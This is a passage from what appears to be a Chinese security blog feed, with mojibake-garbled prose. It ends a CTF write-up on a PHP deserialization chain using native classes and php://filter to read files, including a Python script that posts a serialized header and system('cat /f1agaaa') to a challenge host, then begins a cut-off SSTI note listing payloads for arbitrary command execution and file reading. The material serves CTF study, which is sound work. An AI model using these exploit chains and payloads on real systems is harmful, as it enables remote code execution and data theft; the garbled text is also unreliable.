language_">$this</span>-&gt;name))&#123;<br>            <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">coos</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span> -&gt; file))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;coos-&gt;name;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$aa</span> = <span class="hljs-variable language_">$this</span>-&gt;coos;<br>            <span class="hljs-variable">$bb</span> = <span class="hljs-variable language_">$this</span>-&gt;file;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$aa</span>();<br>        &#125;<br>    &#125;<br>&#125;   <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w_wuw_w</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$aaa</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php|63|\*|\?/i&quot;</span>,<span class="hljs-variable">$this</span> -&gt; key))&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span> -&gt; file);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ä¸è¡Œå“¦&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;aaa;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span> -&gt; aaa = <span class="hljs-keyword">clone</span> <span class="hljs-keyword">new</span> EeE;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$_ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;HTTP_AAAAAA&quot;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_ip</span>);<br></code></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯é€šè¿‡headerå¤´ä¼ å‚çš„ æ¯”è¾ƒæ–°å¥‡</p><p>å¥½å¤šå‡½æ•°æ²¡å®šä¹‰è‚¯å®šå…ˆè¦è¯».txtæ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$eeee</span>=<span class="hljs-string">&quot;-_-&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;name))&#123;<br>            <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">coos</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span> -&gt; file))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;coos-&gt;name;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$aa</span> = <span class="hljs-variable language_">$this</span>-&gt;coos;<br>            <span class="hljs-variable">$bb</span> = <span class="hljs-variable language_">$this</span>-&gt;file;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$aa</span>();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç±»ä¸­cooså’Œfileéƒ½å¯æ§ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨phpåŸç”Ÿç±»æ¥è¯»å–æ–‡ä»¶</p><h2 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a><strong>GlobIterator</strong></h2><p>GlobIterator ç±»ä¹Ÿå¯ä»¥éå†ä¸€ä¸ªæ–‡ä»¶ç›®å½•ï¼Œä½†ä¸ä¸Šé¢ç•¥ä¸åŒçš„æ˜¯å…¶è¡Œä¸ºç±»ä¼¼äº <a href="https://so.csdn.net/so/search?q=glob&spm=1001.2101.3001.7020">glob</a>()ï¼Œå¯ä»¥é€šè¿‡æ¨¡å¼åŒ¹é…æ¥å¯»æ‰¾æ–‡ä»¶è·¯å¾„ã€‚</p><p>å®ƒçš„ç‰¹ç‚¹å°±æ˜¯ï¼Œåªéœ€è¦çŸ¥é“éƒ¨åˆ†åç§°å°±å¯ä»¥è¿›è¡Œéå†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;*txt&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span> = <span class="hljs-string">&#x27;GlobIterator&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$e</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$e</span>);<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°æ–‡ä»¶ååŠ <code>h1nt.txt</code></p><h2 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h2><p>æ‹¿åˆ°æ–‡ä»¶åé‚£æˆ‘ä»¬ç›´æ¥ä½¿ç”¨SplFileObjectåŸç”Ÿç±»ç›´æ¥è¯»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;h1nt.txt&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span> = <span class="hljs-string">&#x27;SplFileObject&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$e</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$e</span>);<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯åªæœ‰</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250122162120344.png" alt="image-20250122162120344"></p><p>åº”è¯¥æ˜¯æ³¨é‡Šæ‰äº†ï¼Œä½¿ç”¨ä¼ªåè®®è¯»å–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=h1nt.txt&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span> = <span class="hljs-string">&#x27;SplFileObject&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$e</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$e</span>);<br></code></pre></td></tr></table></figure><p>è§£ç åå¾—åˆ°</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#ç”¨äºcheck.php</span><br><br><span class="hljs-attribute">key</span>ï¼šqwertyuiopasdfghjklzxcvbnm123456789<br><br><span class="hljs-attribute">move</span>ï¼š<span class="hljs-number">2</span>~<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨</p><p>å°è¯•ä½¿ç”¨åŸç”Ÿç±»æ‰«ç›®å½•è¯•è¯•</p><h2 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a>DirectoryIterator</h2><p><code>glob:///f*</code>ï¼Œè¿™æ˜¯ä¸€ä¸ª PHP çš„æµåŒ…è£…å™¨ï¼Œç”¨äºåŒ¹é…æ ¹ç›®å½•ä¸‹çš„æ‰€æœ‰få¼€å¤´çš„æ–‡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;glob:///f*&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span> = <span class="hljs-string">&#x27;DirectoryIterator&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$e</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$e</span>);<br></code></pre></td></tr></table></figure><p>æ‰¾åˆ°flagçš„æ–‡ä»¶æ˜¯f1agaaa</p><p>ä½¿ç”¨ä¼ªåè®®è¯»å–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=f1agaaa&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span> = <span class="hljs-string">&#x27;SplFileObject&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$e</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$e</span>);<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°flag</p><p>å®˜æ–¹wpæ˜¯flagæ–‡ä»¶æ˜¯ä¸çŸ¥é“çš„è¦ç»“åˆç»™å‡ºçš„keyå’Œmoveå»çˆ†ç ´</p><p>å®˜æ–¹è§£é‡Šï¼š</p><p>å…¶ä¸­moveæ˜¯ç§»åŠ¨çš„æ„æ€ï¼ŒçŒœæµ‹è¿™æ˜¯ä¸€ä¸ªç§»ä½çš„åŠ å¯†ï¼Œå…¶ä¸­çŒœæµ‹keyæ˜¯èŒƒå›´é‚£ä¹ˆå°±æœ‰å‘å·¦å°±æœ‰3ç§å¯èƒ½ï¼Œ å‘å³ä¹Ÿæœ‰3ç§å¯èƒ½ ä½†æ˜¯æç¤º2æç¤ºæˆ‘ä»¬random-éšæœºï¼Œé‚£ä¹ˆåŠ å¯†å¯èƒ½æ˜¯2~7éšæœºï¼Œé‚£ä¹ˆæ¯æ¬¡æ­£å¥½ç›¸ç­‰å°±æ˜¯1&#x2F;24çš„å‡ ç‡</p><p>ä¹‹åå°±æƒ³åŠæ³•æ„é€ é“¾å­è§¦å‘åˆ©ç”¨<code>eval</code>å‡½æ•°äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cycycycy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w_wuw_w</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$aaa</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$a</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-variable">$a</span> -&gt;text -&gt;coos = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w_wuw_w</span>();<br><span class="hljs-variable">$a</span> -&gt;text -&gt;coos -&gt;aaa = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">cycycycy</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-comment">//O:3:&quot;EeE&quot;:2:&#123;s:4:&quot;text&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;N;s:4:&quot;file&quot;;s:1:&quot;1&quot;;s:4:&quot;coos&quot;;O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:8:&quot;cycycycy&quot;:1:&#123;s:1:&quot;a&quot;;N;&#125;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;&#125;s:4:&quot;eeee&quot;;N;&#125;</span><br><br></code></pre></td></tr></table></figure><p>ä¹‹åç”¨è„šæœ¬çˆ†ç ´keyå°±å¯ä»¥äº†ï¼Œè´´ä¸€ä¸ªå®˜æ–¹çš„è„šæœ¬ <strong>æ²¡æ‡‚</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>mi = [<span class="hljs-string">&#x27;i6xstx6d6x6ir&#x27;</span>,<span class="hljs-string">&#x27;u5zarz5s5z5ue&#x27;</span>,<span class="hljs-string">&#x27;y4lpel4a4l4yw&#x27;</span>,<span class="hljs-string">&#x27;sqnhonqjqnqsi&#x27;</span>,<span class="hljs-string">&#x27;dwmjpmwkwmwdo&#x27;</span>,<span class="hljs-string">&#x27;fe1ka1ele1efp&#x27;</span>]<br>d = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> d&lt;<span class="hljs-number">2</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> mi:<br>        data = &#123;<br>            <span class="hljs-string">&#x27;eval&#x27;</span>:<span class="hljs-string">&#x27;system(&quot;cat /f1agaaa&quot;);&#x27;</span><br>        &#125;<br>        url = <span class="hljs-string">f&quot;http://67423f19-3ba4-41b5-9e10-716ce8f5e683.challenge.ctf.show/index.php?get=<span class="hljs-subst">&#123;i&#125;</span>&quot;</span><br>        header = &#123;<br>            <span class="hljs-string">&#x27;aaaaaa&#x27;</span>:<span class="hljs-string">&#x27;O:3:&quot;EeE&quot;:2:&#123;s:4:&quot;text&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;N;s:4:&quot;file&quot;;s:1:&quot;1&quot;;s:4:&quot;coos&quot;;O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:8:&quot;cycycycy&quot;:1:&#123;s:1:&quot;a&quot;;N;&#125;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;&#125;s:4:&quot;eeee&quot;;N;&#125;&#x27;</span><br>        &#125;<br>        reqpose = requests.post(url=url,data=data,headers=header).text<br>        re_text = re.findall(<span class="hljs-string">r&quot;(?&lt;=&lt;/code&gt;).*&quot;</span>, reqpose, re.S)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> re_text:<br>            <span class="hljs-built_in">print</span>(re_text[<span class="hljs-number">0</span>])<br>            d += <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯æ—¥ä¸€web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssti</tag>
      
      <tag>phpåŸç”Ÿç±»</tag>
      
      <tag>flaskåŠ å¯†ä¼ªé€ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Djingo_ssti</title>
    <link href="/tuyi/2025/01/19/Djingo_ssti/"/>
    <url>/tuyi/2025/01/19/Djingo_ssti/</url>
    
    <content type="html"><![CDATA[<p>ä¸€ç‚¹å…³äºsstiçš„å­¦ä¹ ç¬”è®°ä»¥ Djingoä¸ºä¾‹ å½“ç„¶ä¸ä»…ä»…åªæœ‰pythonçš„ssti å…¶ä»–è¯­è¨€ä¹Ÿæœ‰ï¼Œç”šè‡³Rustéƒ½æœ‰</p><p>ä¸ä¼šå°±è¯•è¯•<strong>fenjingä¸€æŠŠæ¢­å“ˆ</strong></p><h1 id="å¸¸è§payload"><a href="#å¸¸è§payload" class="headerlink" title="å¸¸è§payload"></a>å¸¸è§payload</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1</span>ã€ä»»æ„å‘½ä»¤æ‰§è¡Œ<br>&#123;%<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%&#125;&#123;%<span class="hljs-keyword">if</span> i.__name__ ==<span class="hljs-string">&#x27;_wrap_close&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">print</span> i.__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;dir&#x27;</span>).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;<br><span class="hljs-number">2</span>ã€ä»»æ„å‘½ä»¤æ‰§è¡Œ<br>&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()[<span class="hljs-number">138</span>].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;<br>//è¿™ä¸ª<span class="hljs-number">138</span>å¯¹åº”çš„ç±»æ˜¯os._wrap_closeï¼Œåªéœ€è¦æ‰¾åˆ°è¿™ä¸ªç±»çš„ç´¢å¼•å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªpayload<br><span class="hljs-number">3</span>ã€ä»»æ„å‘½ä»¤æ‰§è¡Œ<br>&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;<br><span class="hljs-number">4</span>ã€ä»»æ„å‘½ä»¤æ‰§è¡Œ<br>&#123;&#123;x.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;<br>//xçš„å«ä¹‰æ˜¯å¯ä»¥ä¸ºä»»æ„å­—æ¯ï¼Œä¸ä»…ä»…é™äºx<br><span class="hljs-number">5</span>ã€ä»»æ„å‘½ä»¤æ‰§è¡Œ<br>&#123;&#123;config.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;<br><span class="hljs-number">6</span>ã€æ–‡ä»¶è¯»å–<br>&#123;&#123;x.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()&#125;&#125;<br>//xçš„å«ä¹‰æ˜¯å¯ä»¥ä¸ºä»»æ„å­—æ¯ï¼Œä¸ä»…ä»…é™äºx<br><span class="hljs-number">7.</span>ä»»æ„å‘½ä»¤æ‰§è¡Œ<br>&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;cat /app/flag&#x27;</span>).read()&#125;&#125;<br><span class="hljs-number">8.</span>ä¸å‡ºç½‘å†™é™æ€æ–‡ä»¶<br>&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;echo cat /app/flag 